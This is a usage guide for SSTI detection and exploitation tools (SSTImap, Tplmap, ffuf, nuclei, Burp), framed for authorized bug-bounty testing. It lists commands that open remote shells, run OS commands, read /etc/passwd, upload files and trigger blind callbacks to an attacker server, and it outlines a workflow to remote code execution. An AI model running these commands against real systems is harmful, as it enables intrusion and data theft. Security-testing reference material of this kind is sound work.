# SSTI Tools Collection Guide
> **Author:** MD MAHABUBUR RAHMAN

Complete guide for installing and using SSTI detection/exploitation tools.
Payload lists live in: `ssti-detection-2026.txt`, `ssti-detection-common-2026.txt`, `ssti-to-rce-2026.txt`, `blind-ssti-2026.txt`.

## Table of Contents
- [SSTImap](#sstimap---recommended)
- [Tplmap](#tplmap---legacy)
- [Manual testing with Burp/ffuf/nuclei](#manual-testing)
- [Quick reference](#quick-reference)
- [Troubleshooting](#troubleshooting)

---

## SSTImap — recommended (maintained)

```bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
pip install -r requirements.txt
```

```bash
python sstimap.py -u "http://HOST/page?name=John"            # detect
python sstimap.py -u "http://HOST/page" -d "name=John"       # POST
python sstimap.py -u "http://HOST/page?name=John" --os-shell           # interactive shell
python sstimap.py -u "http://HOST/page?name=John" --os-cmd "id"        # single command
python sstimap.py -u "http://HOST/page?name=John" --read-file /etc/passwd
python sstimap.py -u "http://HOST/page?name=John" --upload-file local.txt --remote-path /tmp/x
python sstimap.py -u "http://HOST/page?name=John" --engine Jinja2
python sstimap.py -u "http://HOST/page?name=John" --engine all
python sstimap.py -u "http://HOST/page?name=John" --time-based
python sstimap.py -u "http://HOST/page?name=John" --blind --host YOUR-SERVER
python sstimap.py -u "http://HOST/page?name=John" --cookie "session=abc"
python sstimap.py -u "http://HOST/page?name=John" --proxy http://127.0.0.1:8080
python sstimap.py -u "http://HOST/page?name=John" -v 2
```

## Tplmap — legacy (Python 2, unmaintained, fewer engines)

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt
```

```bash
python tplmap.py -u "http://HOST/page?name=John"
python tplmap.py -u "http://HOST/page?name=John" --engine Jinja2
python tplmap.py -u "http://HOST/page?name=John" --os-cmd "id"
python tplmap.py -u "http://HOST/page?name=John" --read-file /etc/passwd
python tplmap.py -u "http://HOST/page?name=John" --header "X-Forwarded-For: 127.0.0.1"
```
> GitHub fork with Python 3 support: `SimpsonPT/tplmap` (unofficial).

## Manual testing

### Burp Intruder
1. Send request to Intruder.
2. Mark pipe position in the parameter value.
3. Load `ssti-detection-2026.txt` (universal) → responses matching `49`, `4900`, `{{config}}` dump wins.
4. For blind: use `blind-ssti-2026.txt` with Collaborator, filter by HTTP/DNS hits.

### ffuf (parameter + payload fuzzing)
```bash
ffuf -u "http://HOST/page?FUZZ={{7*7}}" -w parameters.txt          # find the param
ffuf -u "http://HOST/page?q=FUZZ" -w ssti-detection-2026.txt -fs 0  # payloads
ffuf -u "http://HOST/page?q=FUZZ" -w ssti-detection-2026.txt -t 1 -p 0.5   # slow, time-based
```

### nuclei
```bash
nuclei -update-templates
nuclei -u http://HOST -tags ssti
nuclei -u http://HOST/page?name=John -tags ssti -v
nuclei -u http://HOST -t http/template-injection/ -s critical,high -rl 10
```

### python quick detector
```python
import requests
url = "http://HOST/search"; param = "q"
for p in ["{{7*7}}","${7*7}","${{7*7}}","#{7*7}","<%= 7*7 %>","@(7*7)"]:
    r = requests.get(url, params={param: p}, timeout=10)
    print(p, "->", "49" in r.text)
```

---

## Quick reference

| Tool | Best for | Command |
|------|----------|---------|
| SSTImap | detection + shell | `python sstimap.py -u "URL?p=x"` |
| Tplmap | legacy/Velocity | `python tplmap.py -u "URL?p=x"` |
| ffuf | param discovery | `ffuf -u "URL?FUZZ={{7*7}}" -w params.txt` |
| nuclei | mass scanning | `nuclei -u URL -tags ssti` |
| Manual | WAF bypass | Burp Intruder + payload files above |

## Workflow (bug-bounty, in scope only)

```bash
# 1. find candidate endpoints
gospider -s https://HOST | grep -E "(q=|search=|name=|page=|id=|template=)"
# 2. quick math probe
curl -s "https://HOST/search?q={{7*7}}" | grep -c "49"
# 3. identify engine
#     - "config" dict  -> Jinja2 (Flask)
#     - "${.version}"  -> FreeMarker
#     - "#set("        -> Velocity
# 4. RCE via ssti-to-rce-2026.txt or SSTImap --os-cmd "id"
# 5. blind: collaborator ping via blind-ssti-2026.txt
```

## Success criteria

| Result | Meaning |
|--------|---------|
| 49 / 4900 rendered | math eval -> SSTI confirmed |
| command output visible | RCE |
| DNS/HTTP callback received | blind SSTI |
| 5s+ response delay | time-based blind SSTI |
| file content visible | file read |

## Troubleshooting

```bash
pip install -r requirements.txt --force-reinstall   # module errors
# SSL errors:
use the http->https variants above or --force-ssl (tplmap)
# timeouts:
--timeout 30 or -t 1 -p 0.5 (ffuf)
# proxy:
--proxy http://127.0.0.1:8080
```

## Disclaimer

Only test targets you own or have written authorization for. Unauthorized testing is illegal.
